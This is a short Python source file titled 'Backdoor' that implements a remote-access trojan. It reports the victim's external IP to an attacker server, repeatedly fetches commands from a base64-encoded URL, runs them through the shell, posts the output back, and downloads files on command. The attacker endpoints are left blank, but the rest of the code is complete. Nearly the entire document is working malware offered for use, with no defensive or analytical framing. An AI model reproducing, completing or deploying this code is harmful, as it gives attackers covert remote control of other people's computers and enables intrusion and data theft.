# Backdoor

import requests, sys, subprocess, base64, urllib.request, platform, os

# get victims os
system = platform.system()

# url encryption
def b64():
	filecmd = ''
	host = ''
	pwd = ''
	get_command(host, filecmd, pwd)

# funcion that downloads a file from a url
def download_file(host, pwd, url, filename):
	try:
		urllib.request.urlretrieve(url, filename)
		output = "Download of \033[94m" +filename +"\033[97m Finished: \033[94m" + url
		payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : output}
		requests.post(base64.b64decode(host).decode('utf-8'), data=payload)	

	except:
		output = "\033[91mError while downloading " +filename +": " + url
		payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : output}
		requests.post(base64.b64decode(host).decode('utf-8'), data=payload)


def get_command(host, filecmd, pwd):
	command = ''
	
	while command != ':welcome': # if we do not get a welcome requests, keep listenig
		command = requests.get(base64.b64decode(filecmd).decode('utf-8')).text
		# if we get the welcome requests this while ends by itself

	# Send the victims ip to the attacker
	ip  = requests.get('http://www.myexternalip.com/raw').text
	cmd = "<welcome> " + ip 
	# send the welcome 
	payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : cmd}
	requests.post(base64.b64decode(host).decode('utf-8'), data=payload)

	# listening begins
	while True:
		command = requests.get(base64.b64decode(filecmd).decode('utf-8')).text
	
		if not command == ':exit':
	
			if command[:9] == ':download':
				commad, url, filename = command.split(" ")
				download_file(host, pwd, url, filename)
	
			else:
				cmd = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
				cmd = cmd.stdout + cmd.stderr
				payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : cmd}
				requests.post(base64.b64decode(host).decode('utf-8'), data=payload)
		else:
			sys.exit()

if __name__ in "__main__":
	b64()
